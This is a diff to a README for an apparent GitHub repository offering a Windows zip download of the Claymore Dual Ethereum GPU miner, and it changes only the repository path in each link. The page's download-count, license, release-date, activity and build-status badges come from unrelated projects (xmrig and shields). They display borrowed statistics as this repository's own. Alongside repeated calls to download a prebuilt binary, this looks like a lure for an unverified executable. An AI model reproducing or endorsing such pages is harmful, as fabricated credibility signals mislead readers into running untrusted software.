@@ -1,17 +1,17 @@
 <p align="center">
-<a href="https://github.com/Claymore-Dual/Miner/releases/download/v12.0/WINDOWS.-.Claymore.s.Dual.Ethereum+Decred_Siacoin_Lbry_Pascal_Blake2s_Keccak.AMD+NVIDIA.GPU.Miner.v12.0.zip" alt="claymore ethereum miner">
-<img src="https://github.com/Claymore-Dual/Miner/blob/master/files/git-files/5eth.jpg" /></a>
+<a href="https://github.com/Claymore-Dual/Claymore-Dual-Miner/releases/download/v12.0/WINDOWS.-.Claymore.s.Dual.Ethereum+Decred_Siacoin_Lbry_Pascal_Blake2s_Keccak.AMD+NVIDIA.GPU.Miner.v12.0.zip" alt="claymore ethereum miner">
+<img src="https://github.com/Claymore-Dual/Claymore-Dual-Miner/blob/master/files/git-files/5eth.jpg" /></a>
 </p>
 
 <p align="center">
-<a href="https://github.com/Claymore-Dual/Miner/releases" alt="Activity">
+<a href="https://github.com/Claymore-Dual/Claymore-Dual-Miner/releases" alt="Activity">
 <img src="https://img.shields.io/github/downloads/xmrig/xmrig/total.svg" /></a>
 
-<a href="https://github.com/Claymore-Dual/Miner/blob/master/License.txt" alt="Activity">
+<a href="https://github.com/Claymore-Dual/Claymore-Dual-Miner/blob/master/License.txt" alt="Activity">
 <img src="https://img.shields.io/github/license/xmrig/xmrig-amd.svg" /></a>
 <a href="#" alt="Activity">
 <img src="https://img.shields.io/github/release-date-pre/xmrig/xmrig-amd.svg" /></a>
-<a href="https://github.com/Claymore-Dual/Miner/pulse" alt="Activity">
+<a href="https://github.com/Claymore-Dual/Claymore-Dual-Miner/pulse" alt="Activity">
 <img src="https://img.shields.io/github/commit-activity/m/badges/shields.svg" /></a>
 <a href="#">
 <img src="https://img.shields.io/circleci/project/github/badges/shields/master.svg" alt="build status"></a>
@@ -21,8 +21,8 @@
 <p>Claymore Miner is high performance Ethereum (ETH) and ERC20 tokens  miner, with the official full Windows / Linux support.
 </p>
 <p align="center">
-<a href="https://github.com/Claymore-Dual/Miner/releases/download/v12.0/WINDOWS.-.Claymore.s.Dual.Ethereum+Decred_Siacoin_Lbry_Pascal_Blake2s_Keccak.AMD+NVIDIA.GPU.Miner.v12.0.zip" alt="claymore ethereum miner">
-<img src="https://github.com/Claymore-Dual/Miner/blob/master/files/git-files/ethereum-hashrate.png" /></a>
+<a href="https://github.com/Claymore-Dual/Claymore-Dual-Miner/releases/download/v12.0/WINDOWS.-.Claymore.s.Dual.Ethereum+Decred_Siacoin_Lbry_Pascal_Blake2s_Keccak.AMD+NVIDIA.GPU.Miner.v12.0.zip" alt="claymore ethereum miner">
+<img src="https://github.com/Claymore-Dual/Claymore-Dual-Miner/blob/master/files/git-files/ethereum-hashrate.png" /></a>
 </p>
 
 <p>Claymore is one of the most efficient and convenient miners to date, which is why it won the general recognition of miners.
@@ -67,24 +67,24 @@
 * API for rig monitoring
 
 
-<img src="https://github.com/Claymore-Dual/Miner/blob/master/files/git-files/ethereum-mining.jpg" width="795" >
+<img src="https://github.com/Claymore-Dual/Claymore-Dual-Miner/blob/master/files/git-files/ethereum-mining.jpg" width="795" >
 
 
 ## Download
 
 <p>
-<a href="https://github.com/Claymore-Dual/Miner/releases/download/v12.0/WINDOWS.-.Claymore.s.Dual.Ethereum+Decred_Siacoin_Lbry_Pascal_Blake2s_Keccak.AMD+NVIDIA.GPU.Miner.v12.0.zip" alt="claymore ethereum miner">
-<img src="https://github.com/Claymore-Dual/Miner/blob/master/files/git-files/download-btn.png" width="300" ></a></p>
+<a href="https://github.com/Claymore-Dual/Claymore-Dual-Miner/releases/download/v12.0/WINDOWS.-.Claymore.s.Dual.Ethereum+Decred_Siacoin_Lbry_Pascal_Blake2s_Keccak.AMD+NVIDIA.GPU.Miner.v12.0.zip" alt="claymore ethereum miner">
+<img src="https://github.com/Claymore-Dual/Claymore-Dual-Miner/blob/master/files/git-files/download-btn.png" width="300" ></a></p>
 
-* Binary releases: https://github.com/Claymore-Dual/Miner/releases
-* Git tree: https://github.com/Claymore-Dual/Miner.git
-  * Clone with `git clone https://github.com/Claymore-Dual/Miner.git`  :hammer:
+* Binary releases: https://github.com/Claymore-Dual/Claymore-Dual-Miner/releases
+* Git tree: https://github.com/Claymore-Dual/Claymore-Dual-Miner.git
+  * Clone with `git clone https://github.com/Claymore-Dual/Claymore-Dual-Miner.git`  :hammer:
   
 ## How to use
 
 <li>Step 1 – Install your GPUs and set up your computer</li>
 <li>Step 2 – Get an Ethereum wallet (<a target="_blank" rel="noopener noreferrer" href="https://github.com/ethereum/mist/releases">Mist</a> or MyEtherWallet)</li>
-<li>Step 3 – Join a <a href="https://github.com/Claymore-Dual/Miner/wiki/ETH-Mining-Pools-List-(updated-2019)">mining pool</a></li>
+<li>Step 3 – Join a <a href="https://github.com/Claymore-Dual/Claymore-Dual-Miner/wiki/ETH-Mining-Pools-List-(updated-2019)">mining pool</a></li>
 <li>Step 4 – Start mining!</li>
 
 
